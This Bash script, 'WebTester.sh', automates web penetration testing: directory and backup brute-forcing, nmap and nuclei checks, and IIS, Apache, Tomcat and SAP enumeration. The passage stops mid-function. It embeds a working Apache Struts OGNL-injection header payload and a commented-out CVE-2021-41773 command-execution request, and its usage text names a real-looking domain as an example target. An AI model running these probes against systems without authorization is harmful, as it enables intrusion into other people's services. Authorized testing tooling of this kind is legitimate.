#!/bin/bash

OKBLUE='\033[94m'
THREADS="30"
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'


# usamos un bucle while para recorrer todos los argumentos

while (( "$#" )); do
  case "$1" in
    --url)
      URL=$2
      shift 2
      ;;
	--target)
      TARGETS=$2
      shift 2
      ;;
    --mode)
      MODE=$2
      shift 2
      ;;
    --proxychains)
      PROXYCHAINS=$2
      shift 2
      ;;
    --hosting)
      HOSTING=$2
      shift 2
      ;;
    --internet)
      INTERNET=$2
      shift 2
      ;;
    --ipList)
      IP_LIST_FILE=$2
      shift 2
      ;;
    --domain)
      DOMINIO=$2
      shift 2
      ;;
	--extratest)
      EXTRATEST=$2 # oscp = aspx/php file bruteforce + web crawling + sqli + xss
      shift 2
      ;;
    --verbose)
      VERBOSE=$2
      shift 2
      ;;
    --) # end argument parsing
      shift
      break
      ;;
    -*|--*=) # unsupported flags
      echo "Error: Flag no soportada $1" >&2
      exit 1
      ;;
    *) # preserve positional arguments
      PARAMS="$PARAMS $1"
      shift
      ;;
  esac
done

# set positional arguments in their proper place
eval set -- "$PARAMS"

MIN_RAM=900;
MAX_SCRIPT_INSTANCES=100
hilos_web=15;


if [[ -z $TARGETS && -z $URL ]] ; then

cat << "EOF"
WebTester.sh v2
Options:
--mode: hacking/total
--proxychains: s/n
--hosting: s/n
--extratest: oscp
--internet s/n
	* slowloris
	* waf detection
	* clone site
	* Metadata

Para escanear una sola aplicacion:
webTester.sh --url https://ypfb.com.bo --mode $MODE --hosting $HOSTING --internet $INTERNET --verbose $VERBOSE

Para escanear varias aplicaciones web
webTester.sh --target servicios/web.txt --mode hacking --proxychains s --hosting n --internet n --ipList vivos.txt --domain www.ypfb.com.bo --verbose 1
EOF
exit
fi

if [ ! -d ".vulnerabilidades" ]; then #si no existe la carpeta vulnerabilidades es un nuevo escaneo
	mkdir .enumeracion
	mkdir .enumeracion2 
	mkdir .banners
	mkdir .banners2
	mkdir .vulnerabilidades	
	mkdir .vulnerabilidades2 	
	mkdir reportes	
	mkdir -p logs/enumeracion
	mkdir -p logs/vulnerabilidades	
    mkdir responder
	mkdir servicios
	cp /usr/share/lanscanner/.resultados.db .
fi	

# si escaneamos una sola app https://prueba.com.bo | http://192.168.1.2:8080
if [ -z $TARGETS ] ; then
	#cat $TARGETS | cut -d ":" -f1 | sort | uniq > hosts-lives.txt
	#IP_LIST_FILE="hosts-lives.txt"
	http_proto=`echo $URL|cut -d ':' -f1`
	host=`echo $URL|cut -d ':' -f2| tr -d '/'`
	port=`echo $URL|cut -d ':' -f3`
	if [[ -z $port ]]; then
		if [[  ${http_proto} == *"https"* ]]; then
			port="443"
		else
			port="80"
		fi
	fi
	
	echo "" > servicios/web-app-tmp.txt #clear last scan

	# --url http://192.168.1.2:8080
	if [[ $host =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
		ip=$host
		echo "$ip:$port:$http_proto" >> servicios/web-app-tmp.txt
	else # --url https://prueba.com.bo
		DOMINIO=$host
		echo "DOMINIO $DOMINIO"
		echo "$DOMINIO:$port:$http_proto" >> servicios/web-app-tmp.txt

		# for ip in $(dig +short $DOMINIO); do
		# 	#verificar si el sitio es solo accesible mediante dominio
		# 	peticion_dominio=`curl -i -s -k -X $'GET' -H "Host: $DOMINIO" -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0' $http_proto://$DOMINIO/ | wc -c` #bytes
		# 	peticion_ip=`curl -i -s -k -X $'GET' -H "Host: $DOMINIO" -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0' $http_proto://$ip/ | wc -c` #bytes

		# 	# Calcular la resta absoluta de peticion_ip y peticion_dominio
		# 	diff=$(echo ${peticion_dominio}-${peticion_ip} | bc)
		# 	abs_diff=${diff#-}

		# 	# Calcular el 2% de peticion_dominio
		# 	two_percent=$(echo "scale=2; ${peticion_dominio} * 0.02" | bc)

		# 	# Comprobar si la diferencia absoluta es menor que el 2% son el mismo sitio
		# 	if (( $(echo "${abs_diff} < ${two_percent}" | bc -l) )); then				
		# 		echo "$ip:$port:$http_proto" >> servicios/web-app-tmp.txt
		# 	else
		# 		echo "El sitio no es accesible por IP"
				
		# 	fi			
		# done
	fi
	TARGETS=servicios/web-app-tmp.txt
	cat $TARGETS | cut -d ":" -f 1 > servicios/hosts.txt
	IP_LIST_FILE="servicios/hosts.txt"
fi

echo "URL:$URL TARGETS:$TARGETS MODE:$MODE DOMINIO:$DOMINIO PROXYCHAINS:$PROXYCHAINS IP_LIST_FILE:$IP_LIST_FILE HOSTING:$HOSTING INTERNET:$INTERNET VERBOSE:$VERBOSE"

function insert_data () {
	find .vulnerabilidades -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	find .enumeracion -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
	insert-data.py 2>/dev/null
	mv .enumeracion/* .enumeracion2 2>/dev/null
	mv .vulnerabilidades/* .vulnerabilidades2 2>/dev/null
	mv .banners/* .banners2 2>/dev/null
	}

function insert_data_admin () {
	insert-data-admin.py 2>/dev/null
	cat servicios/admin-web-fingerprint.txt >> servicios/admin-web-fingerprint2.txt 2>/dev/null
	rm servicios/admin-web-fingerprint.txt 2>/dev/null

	cat servicios/admin-web.txt >> servicios/admin-web2.txt 2>/dev/null	
	rm servicios/admin-web.txt 2>/dev/null
	}

function formato_ip {
    local ip=$1
    local stat=1

    # Verificar si la entrada es una dirección IP utilizando una expresión regular
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -ra ip_parts <<< "$ip"

        # Verificar cada octeto
        for i in "${ip_parts[@]}"; do
            if [[ $i -le 0 || $i -ge 255 ]]; then
                stat=1
                break
            else
                stat=0
            fi
        done
    fi

    return $stat
}


function waitFinish (){
	################# Comprobar que no haya scripts ejecutandose ########
	while true; do	
		script_instancias=$((`ps aux | egrep 'webData|get_ssl_cert|web-buster|httpmethods.py|msfconsole|nmap|droopescan|CVE-2019-19781.sh|nuclei|owa.pl|curl|firepower.pl|wampServer.pl|medusa|JoomlaJCKeditor.py|joomla-' | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E' | wc -l` - 1))			
		echo -e "\tscript_instancias ($script_instancias)"
		if [[ $script_instancias -gt 0  ]];then 
			echo -e "\t[-] Aun hay instancias de nmap en segundo plano activas"
			sleep 10	
		else		
			break
		fi
	done
}

#No permite que haya muchos script ejecutandose simultaneamente
function waitWeb (){
	######## wait to finish ########
	sleep $1
	  while true; do
	    free_ram=`free -m | grep -i mem | awk '{print $7}'`
		script_instancias=$((`ps aux | egrep "web-buster.pl|webData.pl|nmap|nuclei" | egrep -v 'discover.sh|lanscanner.sh|autohack.sh|heka.sh|grep -E' | wc -l` - 1)) 
		#if [ "$VERBOSE" == 's' ]; then  echo "RAM=$free_ram"; date; fi
		if [[ $free_ram -lt $MIN_RAM || $script_instancias -gt $MAX_SCRIPT_INSTANCES  ]];then 
			echo -e "\t[i] Todavia hay muchos escaneos de web-buster.pl/webData.pl activos ($script_instancias) RAM=$free_ram"  
			sleep 5
		else
			break		  		 
		fi					
	  done
	  ##############################
}

function enumeracionDefecto () {
   proto=$1
   host=$2
   port=$3     
   echo -e "\t[+] Default enumeration ($proto : $host : $port)"
   waitWeb 2.5
    egrep -qiv "AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra" .enumeracion/"$host"_"$port"_webData.txt 
	greprc=$?
	if [[ $greprc -eq 0  ]];then
				
		if [[ "$MODE" == "total" ]]; then

			egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
			greprc=$?						
			if [[ $greprc -eq 1 ]]; then	
				waitWeb 2.5
				echo -e "\t\t[+] Revisando folders ($host - default)"						
				$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt &
			fi
						
			waitWeb 2.5
			echo -e "\t\t[+] Revisando backups de archivos genericos ($host - default)"
			$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &

			waitWeb 2.5
			echo -e "\t\t[+] Revisando archivos por defecto ($host - default)"
			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &	
		fi  
		
		#waitWeb 2.5
		#echo -e "\t\t[+] Revisando paneles administrativos ($host - default)"		
		#$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webadmin.txt &				

		waitWeb 2.5
		echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - default)"
		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1  > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 

		waitWeb 2.5
		echo -e "\t\t[+] Revisando archivos peligrosos ($host - default)"
    	$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &

	fi		
}

function enumeracionSharePoint () {
   proto=$1
   host=$2
   port=$3     
   echo -e "\t[+] Enumerar Sharepoint ($proto : $host : $port)"	

		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then 			
			echo -e "\t\t[+] Revisando directorios comunes ($host - SharePoint)"					
			waitWeb 2.5
			$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -e 'something went wrong' -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt &								
		fi	

	waitWeb 2.5
    echo -e "\t\t[+] Revisando archivos comunes de sharepoint ($host - SharePoint)"
    echo "web-buster.pl -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto -q 1 -e \'something went wrong\'" > logs/enumeracion/"$host"_"$port"_SharePoint.txt  
	$proxychains web-buster.pl  -t $host -p $port -h $hilos_web -d / -m sharepoint -s $proto -e 'something went wrong' -q 1 >> logs/enumeracion/"$host"_"$port"_SharePoint.txt  &   
}

function enumeracionIIS () {
   proto=$1
   host=$2
   port=$3     
   echo -e "\t[+] Enumerar IIS ($proto : $host : $port)"	
	
    egrep -iq "IIS/6.0|IIS/5.1" .enumeracion/"$host"_"$port"_webData.txt
    IIS6=$?
    if [[ $IIS6 -eq 0 ]];then
        echo -e "\t\t[+] Detectado IIS/6.0|IIS/5.1 - Revisando vulnerabilidad web-dav ($host - IIS)"
        echo "$proxychains  nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host" >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null 
        $proxychains nmap -Pn -n -sT -p $port --script=http-iis-webdav-vuln $host >> logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null &            
    fi
   
    echo -e "\t\t[+] Revisando paneles administrativos ($host - IIS)"						
    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m admin -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webadmin.txt &	
    
	waitWeb 2.5
	echo -e "\t\t[+] Revisando archivos peligrosos ($host - IIS)"
    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &

	waitWeb 2.5
   	echo -e "\t\t[+] Revisando archivos genericos ($host - IIS)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &

	waitWeb 2.5				
	echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - IIS)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webserver.txt &

	waitWeb 2.5
	echo -e "\t\t[+] Revisando archivos comunes de webservices ($host - IIS)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webservices -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webservices.txt &

	waitWeb 2.5
	echo -e "\t\t[+] certsrv ($host - IIS)"
	curl --max-time 10 -s -k -o /dev/null -w "%{http_code}"  "http://"$host"/certsrv/certfnsh.asp"  >> logs/enumeracion/"$host"_"$port"_certfnsh.txt &

	if [[ "$MODE" == "total" ]]; then

		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then 

			egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
			greprc=$?						
			if [[ $greprc -eq 1 ]]; then	
				echo -e "\t\t[+] Revisando directorios comunes ($host - IIS)"
				waitWeb 2.5
				web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
			fi			
		fi

		waitWeb 2.5
		echo -e "\t\t[+] Revisando archivos por defecto ($host - IIS)"
		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &
		
		echo -e "\t\t[+] Revisando vulnerabilidad HTTP.sys ($host - IIS)"
		echo "$proxychains  nmap -p $port --script http-vuln-cve2015-1635.nse $host" >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt
		$proxychains nmap -n -Pn -p $port --script http-vuln-cve2015-1635.nse $host >> logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt &
								
		waitWeb 2.5
		echo -e "\t\t[+] Revisando la existencia de backdoors ($host - IIS)"								
		web-buster.pl  -t $host -p $port -h $hilos_web -d / -m backdoorIIS -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_webshell.txt &
		
		waitWeb 2.5
		echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - IIS)"
		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m backupIIS -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_backupweb.txt &
		

		if [  "$EXTRATEST" == "oscp" ]; then	
			
			egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
			greprc=$?
			if [[ $greprc -eq 0  ]];then #		
				echo "CMS detected ($url)"
			else
				waitWeb 2.5
				echo -e "\t\t[+] Revisando archivos aspx ($host - IIS)"
				web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m aspx -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_aspx-files.txt &
			fi		
		fi
		
		$proxychains msfconsole -x "use auxiliary/scanner/http/iis_shortname_scanner;set RHOSTS $host;exploit;exit" > logs/enumeracion/"$host"_"$port"_shortname.txt 2>/dev/null &
		
	fi      

}


function enumeracionApache () {  
   proto=$1
   host=$2
   port=$3  
   echo -e "\t[+] Enumerar Apache ($proto : $host : $port)"	 

	waitWeb 2.5
   echo -e "\t\t[+] Nuclei apache $proto_http $host:$port"	
   nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/apache.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_apache-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_apache-nuclei.txt &

	waitWeb 2.5
	echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
	echo "$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1"  >> logs/enumeracion/"$host"_"$port"_webadmin.txt
	$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webadmin.txt &

	waitWeb 2.5
	echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Apache/nginx)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1  > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
    
	waitWeb 2.5
	echo -e "\t\t[+] Revisando archivos peligrosos ($host - Apache/nginx)"
    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &

  	waitWeb 2.5
   	echo -e "\t\t[+] Revisando archivos genericos ($host - Apache/nginx)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &
	
	waitWeb 2.5
	echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Apache/nginx)"
	web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webserver.txt &

	waitWeb 2.5	
	echo -e "\t\t[+] Revisando si el registro de usuarios esta habilitado ($host - Apache/nginx)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m registroHabilitado -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt &
	
    #  CVE-2021-4177								
    echo -e "\t\t[+] Revisando apache traversal)" 
    $proxychains apache-traversal.py  --target  $host --port $port > logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt &

	# cve-2021-41773
	#echo -e "\t\t[+] Revisando cve-2021-41773 (RCE)" 
	#$proxychains curl -k --max-time 10 $proto://$host:$port/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id' > logs/vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt 2>/dev/null &
	

	if [[  "$MODE" == "total" ]]; then

		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* ]];then 

			egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
			greprc=$?						
			if [[ $greprc -eq 1 ]]; then	
				waitWeb 2.5
				echo -e "\t\t[+] Revisando directorios comunes ($host - Apache/nginx)"
				web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m folders -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &
				sleep 1	
			fi					

			waitWeb 2.5
			echo -e "\t\t[+] Revisando archivos por defecto ($host - Apache/nginx)"
			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m default -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt &			

			waitWeb 2.5
			echo -e "\t\t[+] Revisando archivos graphQL ($host - Apache/nginx)"
	    	$proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m graphQL -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_graphQL.txt &

			if [ "$EXTRATEST" == "oscp" ]; then	
				egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
				greprc=$?
				if [[ $greprc -eq 0  ]];then #		
					echo "CMS detected ($url)"
				else
					waitWeb 2.5
					echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
					web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m php -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_php-files.txt &
				fi
			fi
		fi	
						

		waitWeb 2.5
		echo -e "\t\t[+] Revisando backups de archivos de configuración ($host - Apache/nginx)"
		web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m backupApache -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_backupweb.txt &		
  				
		waitWeb 2.5
		echo -e "\t\t[+] Revisando la existencia de backdoors ($host - Apache/nginx)"
		web-buster.pl  -t $host -p $port -h $hilos_web -d / -m backdoorApache -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_webshell.txt &
								
	fi  
    
    
	
	if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then
		waitWeb 2.5
		echo -e "\t\t[+] Revisando vulnerabilidad slowloris ($host)"
		echo "$proxychains  nmap --script http-slowloris-check -p $port $host" > logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
		nmap -Pn --script http-slowloris-check -p $port $host >> logs/vulnerabilidades/"$host"_"$port"_slowloris.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_slowloris.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_slowloris.txt
	fi

	if [ "$INTERNET" == "n" ]; then 
		waitWeb 2.5
		echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
		web-buster.pl -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &
		
	else
		grep "is behind" logs/enumeracion/"$host"_"$port"_wafw00f.txt > .enumeracion/"$host"_"$port"_wafw00f.txt 2>/dev/null
		egrep -iq "is behind" .enumeracion/"$host"_"$port"_wafw00f.txt
		greprc=$?
		if [[ $greprc -eq 1 ]];then # si hay no hay firewall protegiendo la app								
			waitWeb 2.5
			echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
			web-buster.pl  -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &       								
		fi	
	fi
	

	# grep -qi "strapi" .enumeracion/"$host"_"$port"_webData.txt
	# greprc=$?
	# if [[ $greprc -eq 0 ]];then # si hay no hay firewall protegiendo la app								
	# 	waitWeb 2.5
	# 	echo -e "\t\t[+] Revisando archivos CGI ($host - Apache/nginx)"
	# 	web-buster.pl  -t $host -p $port -h $hilos_web -d / -m cgi -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_archivosCGI.txt &       								
	# else
	# 	echo -e "\t\t[+] Revisando paneles administrativos ($host - Apache/nginx)"
	# 	echo "$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1"  >> logs/enumeracion/"$host"_"$port"_webadmin.txt
	# 	$proxychains web-buster.pl -r 0 -t $host  -p $port -h $hilos_web -d / -m admin -s $proto -q 1  >> logs/enumeracion/"$host"_"$port"_webadmin.txt &
	# fi	

	#echo -e "\t\t[+] Revisando docker socks ($host - Apache/nginx)"
	#curl -XGET --unix-socket /var/run/docker.sock $proto://$host:$port/images/json > logs/vulnerabilidades/"$host"_docker_images.txt
	#grep "Containers" logs/vulnerabilidades/"$host"_docker_images.txt > .vulnerabilidades/"$host"_docker_images.txt
}


function enumeracionTomcat () {  
   proto=$1
   host=$2
   port=$3  
   echo -e "\t\t[+] Enumerar Tomcat ($proto : $host : $port)"   

   $proxychains curl --max-time 10 "$proto":"//$host":"$port/cgi/ism.bat?&dir"  >> logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt &   
   $proxychains curl --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto://$host:$port')).(#ros.flush())}" "$proto://$host:$port/" >> logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null&

	waitWeb 2.5
   	echo -e "\t\t[+] Revisando archivos genericos ($host - Tomcat)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m files -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webarchivos.txt  &

   waitWeb 2.5
   echo -e "\t\t[+] Nuclei tomcat $proto_http $ip:$port"	
   nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/tomcat_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt &
	
	waitWeb 2.5
    echo -e "\t\t[+] Revisando archivos comunes de tomcat ($host - Tomcat)"
    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m tomcat -s $proto -q 1  > logs/enumeracion/"$host"_"$port"_archivosTomcat.txt &

	waitWeb 2.5
	echo -e "\t\t[+] Revisando archivos comunes de servidor ($host - Tomcat)"		
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m webserver -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webserver.txt &

	waitWeb 2.5
	echo -e "\t\t[+] Revisando la presencia de archivos phpinfo, logs, errors ($host - Tomcat)"
	web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m information -s $proto -q 1  > logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null & 
    
	waitWeb 2.5
	echo -e "\t\t[+] Revisando archivos peligrosos ($host - Tomcat)"
    $proxychains web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m archivosPeligrosos -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt &
    
    if [[ "$MODE" == "total" ]]; then 		

		if [[ ${host} != *"nube"* && ${host} != *"webmail"* && ${host} != *"cpanel"* && ${host} != *"autoconfig"* && ${host} != *"ftp"* && ${host} != *"whm"* && ${host} != *"webdisk"*  && ${host} != *"autodiscover"* && ${PROXYCHAINS} != *"s"* ]];then 
			waitWeb 2.5
			echo -e "\t\t[+] Revisando directorios comunes ($host - Tomcat)"								
			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m folders -s $proto -q 1 >> logs/enumeracion/"$host"_"$port"_webdirectorios.txt  &			
			sleep 1;
		fi	

		if [  "$EXTRATEST" == "oscp" ]; then	
			egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
			greprc=$?
			if [[ $greprc -eq 0  ]];then #		
				echo "CMS detected ($url)"
			else
				waitWeb 2.5
			echo -e "\t\t[+] Revisando archivos jsp ($host - tomcat)"
			web-buster.pl -r 0 -t $host -p $port -h $hilos_web -d / -m jsp -s $proto -q 1 >> logs/vulnerabilidades/"$host"_"$port"_webarchivos.txt &
			fi			
		fi								
     
	fi  
    
	  
}

function enumeracionSAP () {  
   proto=$1
   host=$2
   port=$3  
   echo -e "\t\t[+] Enumerar SAP ($proto : $host : $port)"
   
   waitWeb 2.5
   SAP-scan -url=$proto://$host:$port > logs/vulnerabilidades/"$host"_"$port"_sap-scan.txt &

   waitWeb 2.5
   echo -e "\t\t[+] Nuclei SAP $proto_http $ip:$port"	
   nuclei -u "$proto://$host:$port"  -id /root/.local/nuclei-templates/cves/sap.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_sap-nuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_sap-nuclei.txt &
	
	waitWeb 2.5
    echo -e "\t\t[+] Revisando archivos comunes de SAP ($host - SAP)"
